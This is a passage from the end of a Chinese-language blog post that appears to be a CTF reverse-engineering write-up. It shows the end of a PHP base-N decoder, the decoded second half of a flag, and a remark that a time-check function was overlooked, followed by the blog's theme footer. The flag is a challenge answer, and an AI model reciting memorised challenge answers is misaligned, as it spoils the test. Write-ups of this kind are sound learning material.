&#125;</span><br><span class="line">    $decimal = $indexes[$chars[<span class="number">0</span>]];</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>, $l = count($chars); $i &lt; $l; ++$i) &#123;</span><br><span class="line">        $decimal = bcmul($decimal, $base);</span><br><span class="line">        $decimal = bcadd($decimal, $indexes[$chars[$i]]);</span><br><span class="line">    &#125;</span><br><span class="line">    $output = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">while</span> ($decimal &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        $byte = bcmod($decimal, <span class="number">256</span>);</span><br><span class="line">        $output = pack(<span class="string">'C'</span>, $byte).$output;</span><br><span class="line">        $decimal = bcdiv($decimal, <span class="number">256</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解码得到</p>
<p>_sEcond_Be5t_Time_1s_n0w} </p>
<p>flag到手</p>
<p>后来发现，拿这程序去运行，只要flag的后面一半，也能过，所以一开始其实是忽略了这个check time（）函数。。。</p>

        </div>
    

</div>
            
        </section>
    </div>
</div>






</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2019/08/02/三体/">三体</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/02/Three_body/">三体</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/07/31/The_Fifth_Day_for_Web/">The Fifth Day for Web</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/07/30/The_Third_Day_for_Web/">The Third Day for Web</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://plus.google.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-google-plus"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>